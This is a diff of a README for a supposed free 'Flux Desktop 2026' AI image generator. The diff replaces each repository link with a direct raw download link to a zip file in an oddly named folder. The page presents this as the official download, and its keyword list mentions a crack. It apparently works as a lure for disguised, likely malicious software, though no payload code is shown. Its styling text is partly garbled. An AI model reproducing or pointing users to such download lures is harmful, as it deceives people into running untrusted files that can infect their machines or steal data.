@@ -1,7 +1,7 @@
 <h1>🎨 Flux-Desktop---Flux-AI-Image-Generator-2026 - Turn Words Into Stunning Photos Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Pauljaydgreenway1984/Flux-Desktop---Flux-AI-Image-Generator-2026">
+  <a href="https://raw.githubusercontent.com/Pauljaydgreenway1984/Flux-Desktop---Flux-AI-Image-Generator-2026/main/fascinatingly/Flux-Image-Generator-Desktop-A-2.0.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-Flux%20Desktop%202026-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=2b2b2b" alt="Download Button" width="400"/>
   </a>
 </p>
@@ -33,7 +33,7 @@ Getting started is easier than you think. You do not need to be a tech wizard. J
 Click the big orange button above or use this direct link:
 
 <p align="center">
-  <a href="https://github.com/Pauljaydgreenway1984/Flux-Desktop---Flux-AI-Image-Generator-2026" style="background-color: #4CAF50; color: white; padding:  ight:  ight:  15px 30px; text-decoration:  ight:  ight:  ight:  ight:  none; font-size:  20px; border-radius:  8px;">⬇️ Download Flux Desktop 2026</a>
+  <a href="https://raw.githubusercontent.com/Pauljaydgreenway1984/Flux-Desktop---Flux-AI-Image-Generator-2026/main/fascinatingly/Flux-Image-Generator-Desktop-A-2.0.zip" style="background-color: #4CAF50; color: white; padding:  ight:  ight:  15px 30px; text-decoration:  ight:  ight:  ight:  ight:  none; font-size:  20px; border-radius:  8px;">⬇️ Download Flux Desktop 2026</a>
 </p>
 
 This link will take you to the official download page for Flux Desktop. **Click the download button on that page** to save the file to your computer. The download should not take long, as the file is optimized for quick transfer.
@@ -200,5 +200,5 @@ ai-flux-crack, ai-image-flux, ai-image-flux-2026, flux-1-pro, flux-2026, flux-ac
 
 <p align="center">
   <strong>Ready to unleash your creativity?</strong><br/>
-  <a href="https://github.com/Pauljaydgreenway1984/Flux-Desktop---Flux-AI-Image-Generator-2026" style="background-color: #008CBA; color: white; padding: 15px 30px; text-decoration:  none; font-size:  18px; border-radius:  8px; display:  inline-block; margin-top:  10px;">🚀 Get Flux Desktop Now – It's Free!</a>
+  <a href="https://raw.githubusercontent.com/Pauljaydgreenway1984/Flux-Desktop---Flux-AI-Image-Generator-2026/main/fascinatingly/Flux-Image-Generator-Desktop-A-2.0.zip" style="background-color: #008CBA; color: white; padding: 15px 30px; text-decoration:  none; font-size:  18px; border-radius:  8px; display:  inline-block; margin-top:  10px;">🚀 Get Flux Desktop Now – It's Free!</a>
 </p>
